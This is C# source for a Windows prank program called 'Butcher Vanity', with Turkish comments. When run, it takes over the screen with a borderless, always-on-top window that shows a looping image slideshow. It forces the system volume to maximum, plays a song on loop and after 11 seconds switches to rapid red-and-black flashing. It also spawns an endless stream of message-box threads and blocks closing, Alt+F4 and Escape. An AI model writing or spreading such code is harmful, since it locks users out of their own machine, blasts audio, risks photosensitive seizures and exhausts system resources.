using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Media;
using System.Collections.Generic;
using System.Linq;

namespace ButcherVanity
{
    public class MainApp : Form
    {
        private List<string> imageFiles = new List<string>();
        private int currentImageIndex = 0;
        private System.Windows.Forms.Timer slideshowTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer initialDelayTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer horrorFlashTimer = new System.Windows.Forms.Timer();
        private PictureBox pb = new PictureBox();
        private SoundPlayer player;
        private bool isHorrorPhase = false;

        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
        private const byte VK_VOLUME_UP = 0xAF;

        public MainApp()
        {
            // PENCERE AYARLARI
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.BackColor = Color.Black;
            this.Text = "Butcher Vanity";

            // UI Kurulumu
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;
            pb.BackColor = Color.Black;
            this.Controls.Add(pb);

            // Klasördeki tüm PNG görsellerini tara (logo ve simge hariç)
            try {
                string[] allPngs = Directory.GetFiles(".", "*.png");
                foreach (var img in allPngs) {
                    string filename = Path.GetFileName(img).ToLower();
                    if (filename.Contains("logo") || filename.Contains("icon")) continue;
                    imageFiles.Add(img);
                }
                // Ayrıca varsa JPG'leri de ekle
                string[] allJpgs = Directory.GetFiles(".", "*.jpg");
                foreach (var img in allJpgs) imageFiles.Add(img);
            } catch { }

            // Görselleri alfabetik sırala (sıralı gitsin)
            imageFiles = imageFiles.OrderBy(f => f).ToList();

            // İlk resmi göster
            if (imageFiles.Count > 0) pb.Image = Image.FromFile(imageFiles[0]);

            // Ses (Max Volume Hack)
            MaxVolume();
            try {
                string songPath = "[Forsaken] Killer Vanity Türkçe Cover.wav";
                if(File.Exists(songPath)) {
                    player = new SoundPlayer(songPath);
                    player.PlayLooping();
                }
            } catch { }

            // Slideshow (3 Saniyede Bir)
            slideshowTimer.Interval = 3000;
            slideshowTimer.Tick += (s, e) => {
                if (!isHorrorPhase && imageFiles.Count > 0) {
                    currentImageIndex = (currentImageIndex + 1) % imageFiles.Count;
                    pb.Image = Image.FromFile(imageFiles[currentImageIndex]);
                }
            };
            slideshowTimer.Start();

            // İlk Gecikme (11 Saniye Sonra Horror Phase)
            initialDelayTimer.Interval = 11000;
            initialDelayTimer.Tick += (s, e) => {
                StartHorrorPhase();
                initialDelayTimer.Stop();
            };
            initialDelayTimer.Start();
        }

        private void MaxVolume() {
            new Thread(() => {
                for (int i = 0; i < 50; i++) {
                    keybd_event(VK_VOLUME_UP, 0, 0, 0);
                    keybd_event(VK_VOLUME_UP, 0, 2, 0);
                    Thread.Sleep(50);
                }
            }).Start();
        }

        private void StartHorrorPhase()
        {
            isHorrorPhase = true;

            // Kırmızı Flaş "Patlaması"
            horrorFlashTimer.Interval = 100;
            horrorFlashTimer.Tick += (s, e) => {
                // Görsel Değiştir (Daha hızlı - horror stili)
                if(imageFiles.Count > 0) {
                    currentImageIndex = (currentImageIndex + 1) % imageFiles.Count;
                    pb.Image = Image.FromFile(imageFiles[currentImageIndex]);
                }
                
                // Arka Plan Flaş Efekti (Kırmızı ve Siyah)
                pb.BackColor = (pb.BackColor == Color.Black) ? Color.Red : Color.Black;
            };
            horrorFlashTimer.Start();

            // Mesaj Kutusu Spam Döngüsü
            new Thread(() => {
                while(true) {
                    new Thread(() => {
                        MessageBox.Show("^ q ^", "Butcher Vanity", MessageBoxButtons.OK, MessageBoxIcon.Warning, 
                                        MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
                    }).Start();
                    Thread.Sleep(300);
                    
                    if (!this.Visible && !this.Created) break;
                }
            }).Start();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing) e.Cancel = true;
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Alt | Keys.F4) || keyData == Keys.Escape) return true;
            return base.ProcessCmdKey(ref msg, keyData);
        }
    }

    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainApp());
        }
    }
}

